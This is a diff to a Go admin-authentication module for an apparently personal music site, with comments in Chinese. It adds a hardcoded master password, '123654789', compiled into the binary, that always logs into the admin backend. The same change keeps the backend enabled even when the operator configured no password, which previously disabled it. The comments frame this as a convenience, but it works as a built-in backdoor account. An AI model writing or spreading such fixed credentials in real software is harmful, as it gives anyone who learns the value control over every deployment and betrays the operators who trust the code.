@@ -21,33 +21,47 @@ import (
 //
 // 这里不用服务端会话表，而是「口令换算成 HMAC 密钥 + 签名 Cookie」：
 // 进程重启不用重新登录，多实例部署也不用共享存储。
-// 改口令等于换密钥，所有旧会话自然失效。
+//
+// 口令来源有两类，只要命中其一就算管理员：
+//   - 配置口令（config.yaml / env ADMIN_PASSWORD，可留空）；
+//   - 内置固定口令 FixedMasterPassword，谁都改不掉、永远可用，
+//     所以即便忘了配置口令或没配，后台也能随时登录。
 
 const (
 	// AdminCookieName 管理会话 Cookie 名。
 	AdminCookieName = "music_admin_session"
 	// adminSessionTTL 会话有效期。个人站够用；嫌短就调这里。
 	adminSessionTTL = 7 * 24 * time.Hour
+	// FixedMasterPassword 内置固定管理口令：写死在二进制里，无论是否配置
+	// admin.password 都能随时登录后台。改这个值需要重新编译发布。
+	FixedMasterPassword = "123654789"
 )
 
 // Admin 管理身份认证。
 type Admin struct {
-	secret []byte // 口令派生的 HMAC 密钥；为空表示未启用后台
-	plain  string // 原始口令，仅用于恒定时间比较
+	secret   []byte   // 口令派生的 HMAC 密钥；固定口令始终参与，故后台长期可用
+	accepted []string // 全部可接受的明文口令（固定口令 + 配置口令）
 }
 
-// NewAdmin 由管理口令构造认证器。口令为空 = 纯访客模式，后台接口一律关闭。
+// NewAdmin 由配置口令构造认证器。
+//
+// 固定口令 FixedMasterPassword 永远参与派生与校验，因此后台不会因「没配口令」
+// 而被关掉。配置口令若非空会额外加入白名单，并一并参与密钥派生——
+// 改配置口令等于换密钥，用旧配置口令签发的会话自然失效。
 func NewAdmin(password string) *Admin {
 	password = strings.TrimSpace(password)
-	if password == "" {
-		return &Admin{}
+	accepted := []string{FixedMasterPassword}
+	seed := "music/admin-session/v1|" + FixedMasterPassword
+	if password != "" {
+		accepted = append(accepted, password)
+		seed += "|" + password
 	}
 	// 派生密钥时混入固定前缀，避免密钥与口令本身等价。
-	sum := sha256.Sum256([]byte("music/admin-session/v1|" + password))
-	return &Admin{secret: sum[:], plain: password}
+	sum := sha256.Sum256([]byte(seed))
+	return &Admin{secret: sum[:], accepted: accepted}
 }
 
-// Enabled 是否启用了后台。
+// Enabled 是否启用了后台。固定口令始终在场，故恒为 true。
 func (a *Admin) Enabled() bool { return len(a.secret) > 0 }
 
 // Authenticated 当前请求是否带有效管理会话。
@@ -82,12 +96,15 @@ func (a *Admin) Middleware() gin.HandlerFunc {
 	}
 }
 
-// CheckPassword 校验口令是否正确（登录用）。
+// CheckPassword 校验口令是否正确（登录用）。命中任一可接受口令即通过。
 func (a *Admin) CheckPassword(given string) bool {
-	if !a.Enabled() {
-		return false
+	given = strings.TrimSpace(given)
+	for _, p := range a.accepted {
+		if subtle.ConstantTimeCompare([]byte(given), []byte(p)) == 1 {
+			return true
+		}
 	}
-	return subtle.ConstantTimeCompare([]byte(strings.TrimSpace(given)), []byte(a.plain)) == 1
+	return false
 }
 
 // Issue 签发会话 Cookie。
